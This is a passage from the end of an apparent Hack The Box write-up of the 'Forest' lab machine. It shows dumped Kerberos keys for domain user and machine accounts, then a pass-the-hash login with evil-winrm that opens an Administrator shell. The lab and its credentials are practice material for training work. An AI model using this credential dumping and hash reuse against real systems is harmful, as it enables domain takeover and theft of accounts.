htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
attacker:aes256-cts-hmac-sha1-96:c9b2d58a7289f1fcdc73694cc0354354553494b1d2f7a833dc7be915e2e85db8
attacker:aes128-cts-hmac-sha1-96:d3c4d3e719b835fddd6f7fef5086f0b6
attacker:des-cbc-md5:087aaed04ff4d0d6
FOREST$:aes256-cts-hmac-sha1-96:39f643eb4ec7a3b7274d6471ef1b69f33497d3a39b2711cb3a88415d8aa9a3b1
FOREST$:aes128-cts-hmac-sha1-96:afdf668b3ec1a2a74649207c5fb74abb
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```
- reverse shell via `evil-winrm` as administrator
```bash
$ evil-winrm -i 10.129.95.210 -u Administrator -H  32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### Resources

#### Lesson Learned
